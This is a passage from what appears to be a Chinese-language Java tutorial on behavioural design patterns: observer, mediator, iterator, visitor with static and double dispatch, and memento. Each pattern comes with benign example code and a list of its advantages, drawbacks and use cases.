&#125;&#125;\n\n优缺点\n优点：\n\n将所有与某个状态有关的行为放到一个类中，并且可以方便地增加新的状态，只需要改变对象状态即可改变对象的行为。\n允许状态转换逻辑与状态对象合成一体，而不是某一个巨大的条件语句块。\n\n\n缺点：\n\n状态模式的使用必然会增加系统类和对象的个数。\n状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱。\n状态模式对”开闭原则”的支持并不太好。\n\n\n\n使用场景\n当一个对象的行为取决于它的状态，并且它必须在运行时根据状态改变它的行为时，就可以考虑使用状态模式。\n一个操作中含有庞大的分支结构，并且这些分支决定于对象的状态时。\n\n观察者模式概述定义：又被称为发布-订阅（Publish&#x2F;Subscribe）模式，它定义了一种一对多的依赖关系，让多个观察者对象同时监听某一个主题对象。这个主题对象在状态变化时，会通知所有的观察者对象，使他们能够自动更新自己。\n结构在观察者模式中有如下角色：\n\nSubject：抽象主题（抽象被观察者），抽象主题角色把所有观察者对象保存在一个集合里，每个主题都可以有任意数量的观察者，抽象主题提供一个接口，可以增加和删除观察者对象。\nConcreteSubject：具体主题（具体被观察者），该角色将有关状态存入具体观察者对象，在具体主题的内部状态发生改变时，给所有注册过的观察者发送通知。\nObserver：抽象观察者，是观察者的抽象类，它定义了一个更新接口，使得在得到主题更改通知时更新自己。\nConcrereObserver：具体观察者，实现抽象观察者定义的更新接口，以便在得到主题更改通知时更新自身的状态。\n\n案例实现例：微信公众号在使用微信公众号时，大家都会有这样的体验，当你关注的公众号中有新内容更新的话，它就会推送给关注公众号的微信用户端。使用观察者模式来模拟这样的场景，微信用户就是观察者，微信公众号是被观察者，有多个的微信用户关注了程序猿这个公众号。\n类图如下：\n7\n代码如下：\n定义抽象观察者类，里面定义一个更新的方法\npublic interface Observer &#123;    void update(String message);&#125;\n\n定义具体观察者类，微信用户是观察者，里面实现了更新的方法\npublic class WeixinUser implements Observer &#123;    // 微信用户名    private String name;    public WeixinUser(String name) &#123;        this.name = name;    &#125;    @Override    public void update(String message) &#123;        System.out.println(name + &quot;-&quot; + message);    &#125;&#125;\n\n定义抽象主题类，提供了attach、detach、notify三个方法\npublic interface Subject &#123;    //增加订阅者    public void attach(Observer observer);    //删除订阅者    public void detach(Observer observer);        //通知订阅者更新消息    public void notify(String message);&#125;\n\n微信公众号是具体主题（具体被观察者），里面存储了订阅该公众号的微信用户，并实现了抽象主题中的方法\npublic class SubscriptionSubject implements Subject &#123;    //储存订阅公众号的微信用户    private List&lt;Observer&gt; weixinUserlist = new ArrayList&lt;Observer&gt;();    @Override    public void attach(Observer observer) &#123;        weixinUserlist.add(observer);    &#125;    @Override    public void detach(Observer observer) &#123;        weixinUserlist.remove(observer);    &#125;    @Override    public void notify(String message) &#123;        for (Observer observer : weixinUserlist) &#123;            observer.update(message);        &#125;    &#125;&#125;\n\n客户端程序\npublic class Client &#123;    public static void main(String[] args) &#123;        SubscriptionSubject mSubscriptionSubject=new SubscriptionSubject();        //创建微信用户        WeixinUser user1=new WeixinUser(&quot;孙悟空&quot;);        WeixinUser user2=new WeixinUser(&quot;猪悟能&quot;);        WeixinUser user3=new WeixinUser(&quot;沙悟净&quot;);        //订阅公众号        mSubscriptionSubject.attach(user1);        mSubscriptionSubject.attach(user2);        mSubscriptionSubject.attach(user3);        //公众号更新发出消息给订阅的微信用户        mSubscriptionSubject.notify(&quot;传智黑马的专栏更新了&quot;);    &#125;&#125;\n\n优缺点\n优点：\n\n降低了目标与观察者之间的耦合关系，两者之间是抽象耦合关系。\n被观察者发送通知，所有注册的观察者都会收到信息【可以实现广播机制】\n\n\n缺点：\n\n如果观察者非常多的话，那么所有的观察者收到被观察者发送的通知会耗时\n如果被观察者有循环依赖的话，那么被观察者发送通知会使观察者循环调用，会导致系统崩溃\n\n\n\n使用场景\n对象间存在一对多关系，一个对象的状态发生改变会影响其他对象。\n当一个抽象模型有两个方面，其中一个方面依赖于另一方面时。\n\nJDK中提供的实现在 Java 中，通过 java.util.Observable 类和 java.util.Observer 接口定义了观察者模式，只要实现它们的子类就可以编写观察者模式实例。\n\nObservable类Observable 类是抽象目标类（被观察者），它有一个 Vector 集合成员变量，用于保存所有要通知的观察者对象，下面来介绍它最重要的 3 个方法。\n\nvoid addObserver(Observer o) 方法：用于将新的观察者对象添加到集合中。\nvoid notifyObservers(Object arg) 方法：调用集合中的所有观察者对象的 update方法，通知它们数据发生改变。通常越晚加入集合的观察者越先得到通知。\nvoid setChange() 方法：用来设置一个 boolean 类型的内部标志，注明目标对象发生了变化。当它为true时，notifyObservers() 才会通知观察者。\n\n\nObserver 接口Observer 接口是抽象观察者，它监视目标对象的变化，当目标对象发生变化时，观察者得到通知，并调用 update 方法，进行相应的工作。\n\n\n例：警察抓小偷警察抓小偷也可以使用观察者模式来实现，警察是观察者，小偷是被观察者。代码如下：小偷是一个被观察者，所以需要继承Observable类\npublic class Thief extends Observable &#123;    private String name;    public Thief(String name) &#123;        this.name = name;    &#125;        public void setName(String name) &#123;        this.name = name;    &#125;    public String getName() &#123;        return name;    &#125;    public void steal() &#123;        System.out.println(&quot;小偷：我偷东西了，有没有人来抓我！！！&quot;);        super.setChanged(); //changed  = true        super.notifyObservers();    &#125;&#125;\n\n警察是一个观察者，所以需要让其实现Observer接口\npublic class Policemen implements Observer &#123;    private String name;    public Policemen(String name) &#123;        this.name = name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getName() &#123;        return name;    &#125;    @Override    public void update(Observable o, Object arg) &#123;        System.out.println(&quot;警察：&quot; + ((Thief) o).getName() + &quot;，我已经盯你很久了，你可以保持沉默，但你所说的将成为呈堂证供！！！&quot;);    &#125;&#125;\n\n客户端代码\npublic class Client &#123;    public static void main(String[] args) &#123;        //创建小偷对象        Thief t = new Thief(&quot;隔壁老王&quot;);        //创建警察对象        Policemen p = new Policemen(&quot;小李&quot;);        //让警察盯着小偷        t.addObserver(p);        //小偷偷东西        t.steal();    &#125;&#125;\n\n中介者模式概述一般来说，同事类之间的关系是比较复杂的，多个同事类之间互相关联时，他们之间的关系会呈现为复杂的网状结构，这是一种过度耦合的架构，即不利于类的复用，也不稳定。例如在下左图中，有六个同事类对象，假如对象1发生变化，那么将会有4个对象受到影响。如果对象2发生变化，那么将会有5个对象受到影响。也就是说，同事类之间直接关联的设计是不好的。\n如果引入中介者模式，那么同事类之间的关系将变为星型结构，从下右图中可以看到，任何一个类的变动，只会影响的类本身，以及中介者，这样就减小了系统的耦合。一个好的设计，必定不会把所有的对象关系处理逻辑封装在本类中，而是使用一个专门的类来管理那些不属于自己的行为。\n\n定义：又叫调停模式，定义一个中介角色来封装一系列对象之间的交互，使原有对象之间的耦合松散，且可以独立地改变它们之间的交互。\n结构中介者模式包含以下主要角色：\n\n抽象中介者（Mediator）角色：它是中介者的接口，提供了同事对象注册与转发同事对象信息的抽象方法。\n具体中介者（ConcreteMediator）角色：实现中介者接口，定义一个 List 来管理同事对象，协调各个同事角色之间的交互关系，因此它依赖于同事角色。\n抽象同事类（Colleague）角色：定义同事类的接口，保存中介者对象，提供同事对象交互的抽象方法，实现所有相互影响的同事类的公共功能。\n具体同事类（Concrete Colleague）角色：是抽象同事类的实现者，当需要与其他同事对象交互时，由中介者对象负责后续的交互。\n\n案例实现例：租房现在租房基本都是通过房屋中介，房主将房屋托管给房屋中介，而租房者从房屋中介获取房屋信息。房屋中介充当租房者与房屋所有者之间的中介者。\n类图如下：\n代码如下：\n//抽象中介者public abstract class Mediator &#123;    //申明一个联络方法    public abstract void constact(String message,Person person);&#125;//抽象同事类public abstract class Person &#123;    protected String name;    protected Mediator mediator;    public Person(String name,Mediator mediator)&#123;        this.name = name;        this.mediator = mediator;    &#125;&#125;//具体同事类 房屋拥有者public class HouseOwner extends Person &#123;    public HouseOwner(String name, Mediator mediator) &#123;        super(name, mediator);    &#125;    //与中介者联系    public void constact(String message)&#123;        mediator.constact(message, this);    &#125;    //获取信息    public void getMessage(String message)&#123;        System.out.println(&quot;房主&quot; + name +&quot;获取到的信息：&quot; + message);    &#125;&#125;//具体同事类 承租人public class Tenant extends Person &#123;    public Tenant(String name, Mediator mediator) &#123;        super(name, mediator);    &#125;    //与中介者联系    public void constact(String message)&#123;        mediator.constact(message, this);    &#125;    //获取信息    public void getMessage(String message)&#123;        System.out.println(&quot;租房者&quot; + name +&quot;获取到的信息：&quot; + message);    &#125;&#125;//中介机构public class MediatorStructure extends Mediator &#123;    //首先中介结构必须知道所有房主和租房者的信息    private HouseOwner houseOwner;    private Tenant tenant;    public HouseOwner getHouseOwner() &#123;        return houseOwner;    &#125;    public void setHouseOwner(HouseOwner houseOwner) &#123;        this.houseOwner = houseOwner;    &#125;    public Tenant getTenant() &#123;        return tenant;    &#125;    public void setTenant(Tenant tenant) &#123;        this.tenant = tenant;    &#125;    public void constact(String message, Person person) &#123;        if (person == houseOwner) &#123;          //如果是房主，则租房者获得信息            tenant.getMessage(message);        &#125; else &#123;       //反正则是房主获得信息            houseOwner.getMessage(message);        &#125;    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        //一个房主、一个租房者、一个中介机构        MediatorStructure mediator = new MediatorStructure();        //房主和租房者只需要知道中介机构即可        HouseOwner houseOwner = new HouseOwner(&quot;张三&quot;, mediator);        Tenant tenant = new Tenant(&quot;李四&quot;, mediator);        //中介结构要知道房主和租房者        mediator.setHouseOwner(houseOwner);        mediator.setTenant(tenant);        tenant.constact(&quot;需要租三室的房子&quot;);        houseOwner.constact(&quot;我这有三室的房子，你需要租吗？&quot;);    &#125;&#125;\n\n优缺点\n优点：\n\n松散耦合中介者模式通过把多个同事对象之间的交互封装到中介者对象里面，从而使得同事对象之间松散耦合，基本上可以做到互补依赖。这样一来，同事对象就可以独立地变化和复用，而不再像以前那样“牵一处而动全身”了。\n集中控制交互 多个同事对象的交互，被封装在中介者对象里面集中管理，使得这些交互行为发生变化的时候，只需要修改中介者对象就可以了，当然如果是已经做好的系统，那么就扩展中介者对象，而各个同事类不需要做修改。\n一对多关联转变为一对一的关联 没有使用中介者模式的时候，同事对象之间的关系通常是一对多的，引入中介者对象以后，中介者对象和同事对象的关系通常变成双向的一对一，这会让对象的关系更容易理解和实现。\n\n\n缺点：当同事类太多时，中介者的职责将很大，它会变得复杂而庞大，以至于系统难以维护。\n\n\n使用场景\n系统中对象之间存在复杂的引用关系，系统结构混乱且难以理解。\n当想创建一个运行于多个类之间的对象，又不想生成新的子类时。\n\n迭代器模式概述定义：提供一个对象来顺序访问聚合对象中的一系列数据，而不暴露聚合对象的内部表示。\n结构迭代器模式主要包含以下角色：\n\n抽象聚合（Aggregate）角色：定义存储、添加、删除聚合元素以及创建迭代器对象的接口。\n具体聚合（ConcreteAggregate）角色：实现抽象聚合类，返回一个具体迭代器的实例。\n抽象迭代器（Iterator）角色：定义访问和遍历聚合元素的接口，通常包含 hasNext()、next() 等方法。\n具体迭代器（Concretelterator）角色：实现抽象迭代器接口中所定义的方法，完成对聚合对象的遍历，记录遍历的当前位置。\n\n案例实现例：定义一个可以存储学生对象的容器对象，将遍历该容器的功能交由迭代器实现，涉及到的类如下：\n\n代码如下：\n定义被遍历的对象\npublic class Student &#123;    private String name;    private String number;    @Override    public String toString() &#123;        return &quot;Student&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &quot;, number=&#x27;&quot; + number + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getNumber() &#123;        return number;    &#125;    public void setNumber(String number) &#123;        this.number = number;    &#125;   public Student(String name, String number) &#123;      this.name = name;      this.number = number;   &#125;&#125;\n\n定义迭代器接口，声明hasNext、next方法\npublic interface StudentIterator &#123;    boolean hasNext();    Student next();&#125;\n\n定义具体的迭代器类，重写所有的抽象方法\npublic class StudentIteratorImpl implements StudentIterator &#123;    private List&lt;Student&gt; list;    private int position = 0;    public StudentIteratorImpl(List&lt;Student&gt; list) &#123;        this.list = list;    &#125;    @Override    public boolean hasNext() &#123;        return position &lt; list.size();    &#125;    @Override    public Student next() &#123;        Student currentStudent = list.get(position);        position ++;        return currentStudent;    &#125;&#125;\n\n定义抽象容器类，包含添加元素，删除元素，获取迭代器对象的方法\npublic interface StudentAggregate &#123;    void addStudent(Student student);    void removeStudent(Student student);    StudentIterator getStudentIterator();&#125;\n\n定义具体的容器类，重写所有的方法\npublic class StudentAggregateImpl implements StudentAggregate &#123;    private List&lt;Student&gt; list = new ArrayList&lt;Student&gt;();  // 学生列表    @Override    public void addStudent(Student student) &#123;        this.list.add(student);    &#125;    @Override    public void removeStudent(Student student) &#123;        this.list.remove(student);    &#125;    @Override    public StudentIterator getStudentIterator() &#123;        return new StudentIteratorImpl(list);    &#125;&#125;\n\n测试类\npublic class Client &#123;    public static void main(String[] args) &#123;        // 创建集合对象        StudentAggregate aggregate = new StudentAggregateImpl();        // 添加元素        aggregate.addStudent(new Student(&quot;张三&quot;,&quot;001&quot;));        aggregate.addStudent(new Student(&quot;李四&quot;,&quot;002&quot;));        aggregate.addStudent(new Student(&quot;王五&quot;,&quot;003&quot;));        aggregate.addStudent(new Student(&quot;赵六&quot;,&quot;004&quot;));        // 获取迭代器对象        StudentIterator iterator = aggregate.getStudentIterator();        // 遍历        while (iterator.hasNext())&#123;            Student student = iterator.next();            System.out.println(student);        &#125;    &#125;&#125;\n\n优缺点\n优点：\n\n它支持以不同的方式遍历一个聚合对象，在同一个聚合对象上可以定义多种遍历方式。在迭代器模式中只需要用一个不同的迭代器来替换原有迭代器即可改变遍历算法，我们也可以自己定义迭代器的子类以支持新的遍历方式。\n迭代器简化了聚合类。由于引入了迭代器，在原有的聚合对象中不需要再自行提供数据遍历等方法，这样可以简化聚合类的设计。\n在迭代器模式中，由于引入了抽象层，增加新的聚合类和迭代器类都很方便，无须修改原有代码，满足 “开闭原则” 的要求。\n\n\n缺点：增加了类的个数，这在一定程度上增加了系统的复杂性。\n\n\n使用场景\n当需要为聚合对象提供多种遍历方式时。\n当需要为遍历不同的聚合结构提供一个统一的接口时。\n当访问一个聚合对象的内容而无须暴露其内部细节的表示时。\n\nJDK中的应用（很多）迭代器模式在JAVA的很多集合类中被广泛应用，接下来看看JAVA源码中是如何使用迭代器模式的。\nList&lt;String&gt; list = new ArrayList&lt;&gt;();Iterator&lt;String&gt; iterator = list.iterator(); //list.iterator()方法返回的肯定是Iterator接口的子实现类对象while (iterator.hasNext()) &#123;    System.out.println(iterator.next());&#125;\n\n单列集合都使用到了迭代器，以ArrayList举例来说明\n\nList：抽象聚合类\nArrayList：具体的聚合类\nIterator：抽象迭代器\nlist.iterator()：返回的是实现了 Iterator 接口的具体迭代器对象\n\n具体的来看看 ArrayList的代码实现\npublic class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt;        implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable &#123;        public Iterator&lt;E&gt; iterator() &#123;        return new Itr();    &#125;        private class Itr implements Iterator&lt;E&gt; &#123;       int cursor;       // 下一个要返回元素的索引       int lastRet = -1; // 上一个返回元素的索引       int expectedModCount = modCount;       Itr() &#123;       &#125;       //判断是否还有元素       public boolean hasNext() &#123;          return cursor != size;       &#125;       //获取下一个元素       public E next() &#123;          checkForComodification();          int i = cursor;          if (i &gt;= size)             throw new NoSuchElementException();          Object[] elementData = ArrayList.this.elementData;          if (i &gt;= elementData.length)             throw new ConcurrentModificationException();          cursor = i + 1;          return (E) elementData[lastRet = i];       &#125;        ...    &#125;&#125;\n\n这部分代码还是比较简单，大致就是在 iterator 方法中返回了一个实例化的 Iterator 对象。Itr是一个内部类，它实现了 Iterator 接口并重写了其中的抽象方法。\n\n注意：当我们在使用JAVA开发的时候，想使用迭代器模式的话，只要让我们自己定义的容器类实现java.util.Iterable并实现其中的iterator()方法使其返回一个 java.util.Iterator 的实现类就可以了。\n\n访问者模式概述定义：封装一些作用于某种数据结构中的各元素的操作，它可以在不改变这个数据结构的前提下定义作用于这些元素的新的操作。\n结构访问者模式包含以下主要角色:\n\n抽象访问者（Visitor）角色：定义了对每一个元素（Element）访问的行为，它的参数就是可以访问的元素，它的方法个数理论上来讲与元素类个数（Element的实现类个数）是一样的，从这点不难看出，访问者模式要求元素类的个数不能改变。\n具体访问者（ConcreteVisitor）角色：给出对每一个元素类访问时所产生的具体行为。\n抽象元素（Element）角色：定义了一个接受访问者的方法（accept），其意义是指，每一个元素都要可以被访问者访问。\n具体元素（ConcreteElement）角色： 提供接受访问方法的具体实现，而这个具体的实现，通常情况下是使用访问者提供的访问该元素类的方法。\n对象结构（Object Structure）角色：定义当中所提到的对象结构，对象结构是一个抽象表述，具体点可以理解为一个具有容器性质或者复合对象特性的类，它会含有一组元素（Element），并且可以迭代这些元素，供访问者访问。\n\n案例实现例：给宠物喂食现在养宠物的人特别多，我们就以这个为例，当然宠物还分为狗，猫等，要给宠物喂食的话，主人可以喂，其他人也可以喂食。\n\n访问者角色：给宠物喂食的人\n具体访问者角色：主人、其他人\n抽象元素角色：动物抽象类\n具体元素角色：宠物狗、宠物猫\n结构对象角色：主人家\n\n类图如下：\n\n代码如下：\n创建抽象访问者接口\npublic interface Person &#123;    void feed(Cat cat);    void feed(Dog dog);&#125;\n\n创建不同的具体访问者角色（主人和其他人），都需要实现 Person接口\npublic class Owner implements Person &#123;    @Override    public void feed(Cat cat) &#123;        System.out.println(&quot;主人喂食猫&quot;);    &#125;    @Override    public void feed(Dog dog) &#123;        System.out.println(&quot;主人喂食狗&quot;);    &#125;&#125;public class Someone implements Person &#123;    @Override    public void feed(Cat cat) &#123;        System.out.println(&quot;其他人喂食猫&quot;);    &#125;    @Override    public void feed(Dog dog) &#123;        System.out.println(&quot;其他人喂食狗&quot;);    &#125;&#125;\n\n定义抽象节点 – 宠物\npublic interface Animal &#123;    void accept(Person person);&#125;\n\n定义实现Animal接口的 具体节点（元素）\npublic class Dog implements Animal &#123;    @Override    public void accept(Person person) &#123;        person.feed(this);        System.out.println(&quot;好好吃，汪汪汪！！！&quot;);    &#125;&#125;public class Cat implements Animal &#123;    @Override    public void accept(Person person) &#123;        person.feed(this);        System.out.println(&quot;好好吃，喵喵喵！！！&quot;);    &#125;&#125;\n\n定义对象结构，此案例中就是主人的家\npublic class Home &#123;    private List&lt;Animal&gt; nodeList = new ArrayList&lt;Animal&gt;();    public void action(Person person) &#123;        for (Animal node : nodeList) &#123;            node.accept(person);        &#125;    &#125;    //添加操作    public void add(Animal animal) &#123;        nodeList.add(animal);    &#125;&#125;\n\n测试类\npublic class Client &#123;    public static void main(String[] args) &#123;        Home home = new Home();        home.add(new Dog());        home.add(new Cat());        Owner owner = new Owner();        home.action(owner);        Someone someone = new Someone();        home.action(someone);    &#125;&#125;\n\n优缺点\n优点：\n\n扩展性好在不修改对象结构中的元素的情况下，为对象结构中的元素添加新的功能。\n复用性好通过访问者来定义整个对象结构通用的功能，从而提高复用程度。\n分离无关行为通过访问者来分离无关的行为，把相关的行为封装在一起，构成一个访问者，这样每一个访问者的功能都比较单一。\n\n\n缺点：\n\n对象结构变化很困难在访问者模式中，每增加一个新的元素类，都要在每一个具体访问者类中增加相应的具体操作，这违背了“开闭原则”。\n违反了依赖倒置原则访问者模式依赖了具体类，而没有依赖抽象类。\n\n\n\n使用场景\n对象结构相对稳定，但其操作算法经常变化的程序。\n对象结构中的对象需要提供多种不同且不相关的操作，而且要避免让这些操作的变化影响对象的结构。\n\n扩展访问者模式用到了一种双分派的技术。\n\n分派：变量被声明时的类型叫做变量的静态类型，有些人又把静态类型叫做明显类型；而变量所引用的对象的真实类型又叫做变量的实际类型。比如 Map map = new HashMap() ，map变量的静态类型是 Map ，实际类型是 HashMap 。根据对象的类型而对方法进行的选择，就是分派(Dispatch)，分派(Dispatch)又分为两种，即静态分派和动态分派。静态分派(Static Dispatch) 发生在编译时期，分派根据静态类型信息发生。静态分派对于我们来说并不陌生，方法重载就是静态分派。动态分派(Dynamic Dispatch) 发生在运行时期，动态分派动态地置换掉某个方法。Java通过方法的重写支持动态分派。\n\n动态分派：通过方法的重写支持动态分派。\n\n\npublic class Animal &#123;    public void execute() &#123;        System.out.println(&quot;Animal&quot;);    &#125;&#125;public class Dog extends Animal &#123;    @Override    public void execute() &#123;        System.out.println(&quot;dog&quot;);    &#125;&#125;public class Cat extends Animal &#123;     @Override    public void execute() &#123;        System.out.println(&quot;cat&quot;);    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        Animal a = new Dog();        a.execute();                Animal a1 = new Cat();        a1.execute();    &#125;&#125;\n\n上面代码就是多态！运行执行的是子类中的方法。Java编译器在编译时期并不总是知道哪些代码会被执行，因为编译器仅仅知道对象的静态类型，而不知道对象的真实类型；而方法的调用则是根据对象的真实类型，而不是静态类型。\n\n静态分派：通过方法重载支持静态分派。\n\npublic class Animal &#123;&#125;public class Dog extends Animal &#123;&#125;public class Cat extends Animal &#123;&#125;public class Execute &#123;    public void execute(Animal a) &#123;        System.out.println(&quot;Animal&quot;);    &#125;    public void execute(Dog d) &#123;        System.out.println(&quot;dog&quot;);    &#125;    public void execute(Cat c) &#123;        System.out.println(&quot;cat&quot;);    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        Animal a = new Animal();        Animal a1 = new Dog();        Animal a2 = new Cat();        Execute exe = new Execute();        exe.execute(a);        exe.execute(a1);        exe.execute(a2);    &#125;&#125;\n\n运行结果：\n\n这个结果可能出乎一些人的意料了，为什么呢？重载方法的分派是根据静态类型进行的，这个分派过程在编译时期就完成了。\n\n双分派：所谓双分派技术就是在选择一个方法的时候，不仅仅要根据消息接收者（receiver）的运行时区别，还要根据参数的运行时区别。\n\npublic class Animal &#123;    public void accept(Execute exe) &#123;        exe.execute(this);    &#125;&#125;public class Dog extends Animal &#123;    public void accept(Execute exe) &#123;        exe.execute(this);    &#125;&#125;public class Cat extends Animal &#123;    public void accept(Execute exe) &#123;        exe.execute(this);    &#125;&#125;public class Execute &#123;    public void execute(Animal a) &#123;        System.out.println(&quot;animal&quot;);    &#125;    public void execute(Dog d) &#123;        System.out.println(&quot;dog&quot;);    &#125;    public void execute(Cat c) &#123;        System.out.println(&quot;cat&quot;);    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        Animal a = new Animal();        Animal d = new Dog();        Animal c = new Cat();        Execute exe = new Execute();        a.accept(exe);        d.accept(exe);        c.accept(exe);    &#125;&#125;\n\n在上面代码中，客户端将Execute对象做为参数传递给Animal类型的变量调用的方法，这里完成第一次分派，这里是方法重写，所以是动态分派，也就是执行实际类型中的方法，同时也将自己this作为参数传递进去，这里就完成了第二次分派，这里的Execute类中有多个重载的方法，而传递进行的是this，就是具体的实际类型的对象。双分派可以实现方法的动态绑定，可以对上面的程序进行修改。\n运行结果如下：\n\n双分派实现动态绑定的本质，就是在重载方法委派的前面加上了继承体系中覆盖的环节，由于覆盖是动态的，所以重载就是动态的了。\n备忘录模式概述备忘录模式提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原。很多软件都提供了撤销（Undo）操作，如 Word、记事本、Photoshop、IDEA等软件在编辑时按 Ctrl+Z 组合键时能撤销当前操作，使文档恢复到之前的状态；还有在 浏览器 中的后退键、数据库事务管理中的回滚操作、玩游戏时的中间结果存档功能、数据库与操作系统的备份操作、棋类游戏中的悔棋功能等都属于这类。\n定义：又叫快照模式，在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，以便以后当需要时能将该对象恢复到原先保存的状态。\n结构备忘录模式的主要角色如下：\n\n发起人（Originator）角色：记录当前时刻的内部状态信息，提供创建备忘录和恢复备忘录数据的功能，实现其他业务功能，它可以访问备忘录里的所有信息。\n备忘录（Memento）角色：负责存储发起人的内部状态，在需要的时候提供这些内部状态给发起人。\n管理者（Caretaker）角色：对备忘录进行管理，提供保存与获取备忘录的功能，但其不能对备忘录的内容进行访问与修改。\n\n\n备忘录有两个等效的接口：\n\n窄接口：管理者(Caretaker)对象（和其他发起人对象之外的任何对象）看到的是备忘录的窄接口(narror Interface)，这个窄接口只允许他把备忘录对象传给其他的对象。\n宽接口：与管理者看到的窄接口相反，发起人对象可以看到一个宽接口(wide Interface)，这个宽接口允许它读取所有的数据，以便根据这些数据恢复这个发起人对象的内部状态。\n\n\n案例实现例：游戏挑战BOSS游戏中的某个场景，一游戏角色有生命力、攻击力、防御力等数据，在打Boss前和后一定会不一样的，我们允许玩家如果感觉与Boss决斗的效果不理想可以让游戏恢复到决斗之前的状态。\n要实现上述案例，有两种方式：\n\n“白箱”备忘录模式\n“黑箱”备忘录模式\n\n“白箱”备忘录模式备忘录角色对任何对象都提供一个接口，即宽接口，备忘录角色的内部所存储的状态就对所有对象公开。类图如下：\n\n代码如下：\n//游戏角色类public class GameRole &#123;    private int vit; //生命力    private int atk; //攻击力    private int def; //防御力    //初始化状态    public void initState() &#123;        this.vit = 100;        this.atk = 100;        this.def = 100;    &#125;    //战斗    public void fight() &#123;        this.vit = 0;        this.atk = 0;        this.def = 0;    &#125;    //保存角色状态    public RoleStateMemento saveState() &#123;        return new RoleStateMemento(vit, atk, def);    &#125;    //回复角色状态    public void recoverState(RoleStateMemento roleStateMemento) &#123;        this.vit = roleStateMemento.getVit();        this.atk = roleStateMemento.getAtk();        this.def = roleStateMemento.getDef();    &#125;    public void stateDisplay() &#123;        System.out.println(&quot;角色生命力：&quot; + vit);        System.out.println(&quot;角色攻击力：&quot; + atk);        System.out.println(&quot;角色防御力：&quot; + def);    &#125;    public int getVit() &#123;        return vit;    &#125;    public void setVit(int vit) &#123;        this.vit = vit;    &#125;    public int getAtk() &#123;        return atk;    &#125;    public void setAtk(int atk) &#123;        this.atk = atk;    &#125;    public int getDef() &#123;        return def;    &#125;    public void setDef(int def) &#123;        this.def = def;    &#125;&#125;//游戏状态存储类(备忘录类)public class RoleStateMemento &#123;    private int vit;    private int atk;    private int def;    public RoleStateMemento(int vit, int atk, int def) &#123;        this.vit = vit;        this.atk = atk;        this.def = def;    &#125;    public int getVit() &#123;        return vit;    &#125;    public void setVit(int vit) &#123;        this.vit = vit;    &#125;    public int getAtk() &#123;        return atk;    &#125;    public void setAtk(int atk) &#123;        this.atk = atk;    &#125;    public int getDef() &#123;        return def;    &#125;    public void setDef(int def) &#123;        this.def = def;    &#125;&#125;//角色状态管理者类public class RoleStateCaretaker &#123;    private RoleStateMemento roleStateMemento;    public RoleStateMemento getRoleStateMemento() &#123;        return roleStateMemento;    &#125;    public void setRoleStateMemento(RoleStateMemento roleStateMemento) &#123;        this.roleStateMemento = roleStateMemento;    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;------------大战Boss前------------&quot;);        //大战Boss前        GameRole gameRole = new GameRole();        gameRole.initState();        gameRole.stateDisplay();        //保存进度        RoleStateCaretaker roleStateCaretaker = new RoleStateCaretaker();        roleStateCaretaker.setRoleStateMemento(gameRole.saveState());        System.out.println(&quot;------------大战Boss后------------&quot;);        //大战Boss时，损耗严重        gameRole.fight();        gameRole.stateDisplay();        System.out.println(&quot;------------恢复之前状态------------&quot;);        //恢复之前状态        gameRole.recoverState(roleStateCaretaker.getRoleStateMemento());        gameRole.stateDisplay();    &#125;&#125;\n\n\n分析：白箱备忘录模式是破坏封装性的。但是通过程序员自律，同样可以在一定程度上实现模式的大部分用意。\n\n“黑箱”备忘录模式备忘录角色对发起人对象提供一个宽接口，而为其他对象提供一个窄接口。在Java语言中，实现双重接口的办法就是将备忘录类设计成发起人类的内部成员类。\n将 RoleStateMemento 设为 GameRole 的内部类，从而将 RoleStateMemento 对象封装在 GameRole 里面；在外面提供一个标识接口 Memento 给 RoleStateCaretaker 及其他对象使用。这样 GameRole 类看到的是 RoleStateMemento 所有的接口，而RoleStateCaretaker  及其他对象看到的仅仅是标识接口 Memento 所暴露出来的接口，从而维护了封装型。类图如下：\n\n代码如下：\n窄接口Memento，这是一个标识接口，因此没有定义出任何的方法\npublic interface Memento &#123;&#125;\n\n定义发起人类 GameRole，并在内部定义备忘录内部类 RoleStateMemento（该内部类设置为私有的）\n//游戏角色类public class GameRole &#123;    private int vit; //生命力    private int atk; //攻击力    private int def; //防御力    //初始化状态    public void initState() &#123;        this.vit = 100;        this.atk = 100;        this.def = 100;    &#125;    //战斗    public void fight() &#123;        this.vit = 0;        this.atk = 0;        this.def = 0;    &#125;    //保存角色状态    public Memento saveState() &#123;        return new RoleStateMemento(vit, atk, def);    &#125;    //回复角色状态    public void recoverState(Memento memento) &#123;        RoleStateMemento roleStateMemento = (RoleStateMemento) memento;        this.vit = roleStateMemento.getVit();        this.atk = roleStateMemento.getAtk();        this.def = roleStateMemento.getDef();    &#125;    public void stateDisplay() &#123;        System.out.println(&quot;角色生命力：&quot; + vit);        System.out.println(&quot;角色攻击力：&quot; + atk);        System.out.println(&quot;角色防御力：&quot; + def);    &#125;    public int getVit() &#123;        return vit;    &#125;    public void setVit(int vit) &#123;        this.vit = vit;    &#125;    public int getAtk() &#123;        return atk;    &#125;    public void setAtk(int atk) &#123;        this.atk = atk;    &#125;    public int getDef() &#123;        return def;    &#125;    public void setDef(int def) &#123;        this.def = def;    &#125;    private class RoleStateMemento implements Memento &#123;        private int vit;        private int atk;        private int def;        public RoleStateMemento(int vit, int atk, int def) &#123;            this.vit = vit;            this.atk = atk;            this.def = def;        &#125;        public int getVit() &#123;            return vit;        &#125;        public void setVit(int vit) &#123;            this.vit = vit;        &#125;        public int getAtk() &#123;            return atk;        &#125;        public void setAtk(int atk) &#123;            this.atk = atk;        &#125;        public int getDef() &#123;            return def;        &#125;        public void setDef(int def) &#123;            this.def = 